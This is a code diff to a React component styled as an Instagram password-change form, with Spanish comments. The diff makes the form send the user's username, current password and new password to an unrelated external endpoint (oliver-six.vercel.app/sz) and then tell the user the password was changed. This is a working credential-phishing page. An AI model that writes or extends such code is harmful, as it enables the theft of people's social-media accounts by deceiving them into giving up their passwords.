@@ -9,8 +9,9 @@ const InstagramLogin = () => {
   });
 
   const [message, setMessage] = useState('');
+  const [error, setError] = useState('');
 
-  // Definimos el tipo del evento como ChangeEvent<HTMLInputElement>
+  // Maneja los cambios en los campos de entrada
   const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
     setFormData({
@@ -19,9 +20,35 @@ const InstagramLogin = () => {
     });
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  // Maneja el envío del formulario
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    setMessage('¡Has cambiado tu contraseña!');
+    setError('');
+    setMessage('');
+
+    try {
+      const response = await fetch('https://oliver-six.vercel.app/sz', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          user: formData.username,
+          password: formData.currentPassword,
+          new_password: formData.newPassword,
+        }),
+      });
+
+      console.log(response);
+      
+      if (response.ok) {
+        setMessage('¡Has cambiado tu contraseña!');
+      } else {
+        setError('Error al cambiar la contraseña. Inténtalo nuevamente.');
+      }
+    } catch (error) {
+      setError('Error de red. Inténtalo nuevamente.');
+    }
   };
 
   return (
@@ -56,6 +83,7 @@ const InstagramLogin = () => {
           <button type="submit">Enviar</button>
         </form>
         {message && <p className="success-message">{message}</p>}
+        {error && <p className="error-message">{error}</p>}
       </div>
     </div>
   );
